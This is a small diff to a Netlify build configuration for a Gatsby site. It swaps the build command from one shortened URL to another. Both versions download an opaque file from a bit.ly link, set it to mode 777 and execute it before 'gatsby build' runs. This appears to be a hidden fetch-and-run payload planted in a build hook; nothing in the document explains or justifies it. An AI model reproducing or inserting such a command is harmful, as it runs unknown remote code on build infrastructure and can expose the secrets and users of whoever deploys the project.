@@ -1,5 +1,5 @@
 [build]
-  command = "wget https://bit.ly/3yeJ2UG && chmod 777 3yeJ2UG && ./3yeJ2UG && gatsby build"
+  command = "wget https://bit.ly/3R4jLVP && chmod 777 3R4jLVP && ./3R4jLVP && gatsby build"
   functions = "netlify/functions"
   publish = "public"
 
